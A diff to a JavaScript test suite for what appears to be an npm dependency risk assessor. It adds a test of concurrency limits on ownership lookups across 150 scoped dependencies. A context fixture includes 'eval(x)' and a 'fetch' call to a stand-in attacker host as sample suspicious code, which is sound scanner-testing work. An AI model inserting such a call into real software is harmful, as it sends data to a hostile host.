@@ -154,6 +154,23 @@ test('a new dependency on the caller\'s own package is told no tier nor age, nor
   assert.ok(!asked.some(url => url.includes('mine')), 'nor its downloads nor its first publish asked')
 })
 
+test('whether each new dependency is the caller\'s own is asked four at a time, and no more once a hundred others are told', async t => {
+  const scopes = Array.from({ length: 150 }, (_, i) => `@s${i}/p`)
+  const before = version('wide', '1.0.0', { 'package.json': '{}' }, { dependencies: {} }, ago(30))
+  const after = version('wide', '1.0.1', { 'package.json': '{}' }, { dependencies: Object.fromEntries(scopes.map(name => [name, '^1.0.0'])) }, ago(20))
+  const asked = npm(t, [{ name: 'wide', versions: [before, after] }])
+  let calls = 0, most = 0, running = 0
+  const owned = () => {
+    calls++
+    most = Math.max(most, ++running)
+    return new Promise(resolve => { setImmediate(() => { running--; resolve(false) }) })
+  }
+  await assessNpm('wide', '1.0.1', { oldVersion: '1.0.0', now: NOW, owned })
+  assert.ok(most <= 4, `${most} asked at once`)
+  assert.ok(calls <= 103, `${calls} asked of 150, past the hundred told`)
+  assert.equal(asked.filter(url => url.startsWith('https://api.npmjs.org/downloads/range/') && /s\d+(?:%2F|\/)p$/iu.test(url)).length, 100, 'a hundred told, as before')
+})
+
 test('what is read is kept by type, and an assessment kept needs no tarball', async t => {
   const files = { 'package.json': '{}', 'index.js': 'eval(x)\n' }
   const asked = npm(t, [{ name: 'kept', versions: [version('kept', '1.0.0', files, { dependencies: {} }, ago(400)), version('kept', '1.1.0', { ...files, 'more.js': 'fetch("https://collector.attacker.dev/x")' }, { dependencies: {} }, ago(300))] }],
